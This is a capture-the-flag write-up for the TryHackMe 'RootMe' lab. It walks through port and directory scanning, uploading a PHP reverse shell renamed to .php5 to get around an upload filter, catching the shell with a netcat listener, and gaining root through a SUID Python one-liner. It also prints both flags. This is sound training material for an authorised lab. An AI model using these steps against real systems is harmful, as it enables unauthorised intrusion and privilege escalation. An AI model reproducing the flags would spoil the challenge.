## RootMe - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/rrootme)

**IP: 10.10.145.91**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Nmap, Gobuster

[Tool Name](tool link)<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Reconnaissance

- Starting with Nmap and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.145.91
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
  |   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
  |_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  | http-cookie-flags: 
  |   /: 
  |     PHPSESSID: 
  |_      httponly flag not set
  |_http-title: HackIT - Home
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u 10.10.145.91 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /uploads              (Status: 301) [Size: 314] [--> http://10.10.145.91/uploads/]
  /css                  (Status: 301) [Size: 310] [--> http://10.10.145.91/css/]
  /js                   (Status: 301) [Size: 309] [--> http://10.10.145.91/js/]
  /panel                (Status: 301) [Size: 312] [--> http://10.10.145.91/panel/]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- This will cover recon part, let's do reverse shell now.

---

## ⚙️ Shell Access

- When you visit `http://10.10.145.91/panel/` you will have an option to upload files, you already know what that means. First, I used PHP one liner but it didn't work because uploading a .php file is not allowed. But what about .php5?
  If you are using Kali, you already have a php reverse shell in your system, just copy it wherever you want it, change extension to `.php5` and change IP and Port in the code to match [YOUR-THM-IP] and listening port.
  Upload the shell, start a listener and visit the shell page and you are in! Shell can be found in `/upload` directory.

  ```
  cp /usr/share/webshells/php/php-reverse-shell.php ../../shell.php5

  nc -lvnp 4444                    
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.145.91] 34108
  Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
   14:20:24 up 13 min,  0 users,  load average: 0.00, 0.04, 0.06
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- Perfect, as always I have to change it to putty shell then look for flags.

  ```
  python -c 'import pty;pty.spawn("/bin/bash")'
  ^Z
  stty raw -echo; fg
  export TERM=xterm
  ```

---

## 🧍 User Privilege Escalation

- User flag is easy to find.

  ```
  bash-4.4$ find / -name user.txt 2>/dev/null
  /var/www/user.txt
  
  bash-4.4$ cat /var/www/user.txt 
  THM{y0u_g0t_a_sh3ll}
  ```

- Moving to escalation.

---

## 👑 Root Privilege Escalation

- Hint already told us to enumerate SUID and look for suspicious file, so let's do that first.

  ```
  find / -type f -perm -4000 2>/dev/null

  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/lib/snapd/snap-confine
  /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
  /usr/lib/eject/dmcrypt-get-device
  /usr/lib/openssh/ssh-keysign
  /usr/lib/policykit-1/polkit-agent-helper-1
  /usr/bin/traceroute6.iputils
  /usr/bin/newuidmap
  /usr/bin/newgidmap
  /usr/bin/chsh
  /usr/bin/python
  /usr/bin/at
  /usr/bin/chfn
  /usr/bin/gpasswd
  /usr/bin/sudo
  /usr/bin/newgrp
  /usr/bin/passwd
  /usr/bin/pkexec
  /snap/core/8268/bin/mount
  /snap/core/8268/bin/ping
  /snap/core/8268/bin/ping6
  /snap/core/8268/bin/su
  /snap/core/8268/bin/umount
  /snap/core/8268/usr/bin/chfn
  /snap/core/8268/usr/bin/chsh
  /snap/core/8268/usr/bin/gpasswd
  /snap/core/8268/usr/bin/newgrp
  /snap/core/8268/usr/bin/passwd
  /snap/core/8268/usr/bin/sudo
  /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /snap/core/8268/usr/lib/openssh/ssh-keysign
  /snap/core/8268/usr/lib/snapd/snap-confine
  /snap/core/8268/usr/sbin/pppd
  /snap/core/9665/bin/mount
  /snap/core/9665/bin/ping
  /snap/core/9665/bin/ping6
  /snap/core/9665/bin/su
  /snap/core/9665/bin/umount
  /snap/core/9665/usr/bin/chfn
  /snap/core/9665/usr/bin/chsh
  /snap/core/9665/usr/bin/gpasswd
  /snap/core/9665/usr/bin/newgrp
  /snap/core/9665/usr/bin/passwd
  /snap/core/9665/usr/bin/sudo
  /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /snap/core/9665/usr/lib/openssh/ssh-keysign
  /snap/core/9665/usr/lib/snapd/snap-confine
  /snap/core/9665/usr/sbin/pppd
  /bin/mount
  /bin/su
  /bin/fusermount
  /bin/ping
  /bin/umount
  ```
  
- Suspicious file here is Python. You can find the SUID exploitation one liner on GTFOBins, look for Python then SUID. Just copy/paste the command, run it and you will escalate to root. After that just read the flag.

  ```
  $ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
  # whoami
  root
  
  # cat /root/root.txt
  THM{pr1v1l3g3_3sc4l4t10n}
  ```


---

## 🏁 Flags

- **User Flag**: `THM{y0u_g0t_a_sh3ll}`
- **Root Flag**: `THM{pr1v1l3g3_3sc4l4t10n}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finally used Python for escalation.`

- What did I learn?
  `Just sharpening my skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
